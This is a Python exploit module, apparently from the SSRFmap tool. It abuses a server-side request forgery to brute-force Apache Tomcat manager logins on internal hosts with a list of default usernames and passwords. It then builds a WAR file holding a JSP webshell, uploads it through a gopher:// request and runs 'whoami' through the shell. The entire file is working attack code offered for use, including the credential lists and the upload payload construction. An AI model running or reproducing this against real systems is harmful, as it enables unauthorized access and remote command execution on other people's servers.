from ssrfmap.core.utils import *
import argparse
import base64
import binascii 
import getopt
import logging
import re
import sys
import urllib
import zipfile


# NOTE
# This exploit is a Python 3 version of Pimps script 
# with a simple bruteforcer and auto exploiter
# https://github.com/pimps/gopher-tomcat-deployer

name          = "tomcat"
description   = "Tomcat - Bruteforce manager and WAR uploader"
author        = "Swissky"
documentation = [
    "https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html", 
    "https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown",
    "https://github.com/pimps/gopher-tomcat-deployer"
    ]

class exploit():
    SERVER_HOST   = "127.0.0.1"
    SERVER_PORT   = "8888"
    SERVER_TOMCAT = "manager/html"
    SERVER_USER   = "tomcat"
    SERVER_PASS   = "tomcat"
    EXPLOIT_JSP   = "data/cmd.jsp"
    EXPLOIT_WAR   = "/tmp/cmd.war"
    tomcat_user = ["tomcat", "admin", "both", "manager", "role1", "role", "root"]
    tomcat_pass = ["password", "tomcat", "admin", "manager", "role1", "changethis", "changeme", "r00t", "root", "s3cret","Password1", "password1"]

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.args = args

        # Using a generator to create the host list
        gen_host = gen_ip_list(self.SERVER_HOST, args.level)
        for ip in gen_host:
            for usr in self.tomcat_user:
                for pss in self.tomcat_pass:
                    payload = wrapper_http(self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss)
                    r = requester.do_request(args.param, payload)

                    if r != None and not "s3cret" in r.text:
                        logging.info("Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(usr, pss))
                        self.SERVER_USER = usr
                        self.SERVER_PASS = pss

                        # bruteforce padding for a good zip file
                        # worst solution until I find an alternate
                        # way to convert the is_ascii from the original 
                        # Python 2 payload
                        for i in range(5):
                            payload = self.send_war(i)
                            r = requester.do_request(args.param, payload)
                            
                            if args.verbose == True:
                                logging.info("Generated payload : {}".format(payload))

                            logging.info("Sending CMD to cmd.jsp for padding: {}".format(i))
                            payload = wrapper_http("cmd/cmd.jsp?cmd=whoami", self.SERVER_HOST, self.SERVER_PORT)
                            r = requester.do_request(args.param, payload)
                            if r.text != None and r.text != "":
                                logging.info(r.text)
                        break


    def send_war(self, padding):
        with open(self.EXPLOIT_JSP, 'r') as f:
            webshell_data = f.read()
            webshell_data = self.validate_webshell_length_and_crc32(webshell_data + ' '*padding)

            if self.args.verbose == True:
                logging.info("[+] Creating new zip file: " + self.EXPLOIT_WAR)
            self.create_war_zip_file(self.EXPLOIT_WAR, self.EXPLOIT_JSP, webshell_data)

            if self.args.verbose == True:
                logging.info("[+] Valid WAR file generated... Creating the gopher payload now...")
            gopher_payload = self.build_gopher_payload()
            
            return wrapper_gopher(gopher_payload, self.SERVER_HOST, self.SERVER_PORT)

    def create_war_zip_file(self, war_filename,inputfile,webshell_data):
        warzip = zipfile.ZipFile(war_filename,'w') 
        # Write a known good date/war_filename stamp
        # this date/time does not contain and invalid byte values
        info = zipfile.ZipInfo(inputfile,date_time=(1980, 1, 1, 0, 0, 0))
        # Write out the webshell the zip file.
        warzip.writestr(info,webshell_data)
        warzip.close()

    def validate_webshell_length_and_crc32(self, webshell_data): 
        valid_length=0
        valid_crc32=0
        modded_length=0
        
        if self.args.verbose == True:
            logging.info("Original file length: {}".format('{0:0{1}X}'.format(len(webshell_data),8)))
            logging.info("Original file crc32: {}".format(format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')))
        
        while valid_length == 0 or valid_crc32 == 0:
            crc_string = format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')
            ws_len_byte_string = '{0:0{1}X}'.format(len(webshell_data),8)
            valid_length=1
            valid_crc32=1
            lead_byte_locations = [0,2,4,6]
            for x in lead_byte_locations:
                try:
                    if(ws_len_byte_string[x] == '8' or ws_len_byte_string[x] == '9' or crc_string[x] == '8' or crc_string[x] == '9'):    
                        webshell_data = webshell_data+" "
                        valid_length = 0
                        valid_crc32 = 0
                        modded_length = modded_length+1
                except:
                    continue
        
        if modded_length > 0:
            logging.info("The input file CRC32 or file length contained an invalid byte.")
            logging.info("Length adjustment completed. " + str(modded_length) + " whitespace ' ' chars were added to the webshell input.")
            logging.info("New file length: " +'{0:0{1}X}'.format(len(webshell_data),8))
            logging.info("New file crc32: " + format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x'))
        return webshell_data

    def url_encode_all(self, string):
        return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)
        
    def build_gopher_payload(self):
        warfile = ""
        with open(self.EXPLOIT_WAR, 'rb') as f:
            warfile = f.read()

        headers =  'POST /manager/html/upload HTTP/1.1\r\n'
        headers += 'Host: {host}:{port}\r\n'
        headers += 'Content-Type: multipart/form-data; boundary=---------------------------1510321429715549663334762841\r\n'
        headers += 'Content-Length: {contentlength}\r\n'
        headers += 'Authorization: Basic {credential}\r\n'
        headers += 'Connection: close\r\n'
        headers += 'Upgrade-Insecure-Requests: 1\r\n'
        headers += '\r\n'
        headers += '{content_body}'

        content =  '-----------------------------1510321429715549663334762841\r\n'
        content += 'Content-Disposition: form-data; name="deployWar"; filename="{filename}"\r\n'
        content += 'Content-Type: application/octet-stream\r\n'
        content += '\r\n'
        content += '{warfile}\r\n'
        content += '-----------------------------1510321429715549663334762841--\r\n'

        content_body = content.format(
            filename=self.EXPLOIT_WAR,
            warfile=warfile
            )
        payload = headers.format(
            host=self.SERVER_HOST, 
            port=self.SERVER_PORT, 
            credential=base64.b64encode((self.SERVER_USER + ":" + self.SERVER_PASS).encode()), 
            contentlength=len(content_body),
            content_body=content_body
            )
        return self.url_encode_all(payload)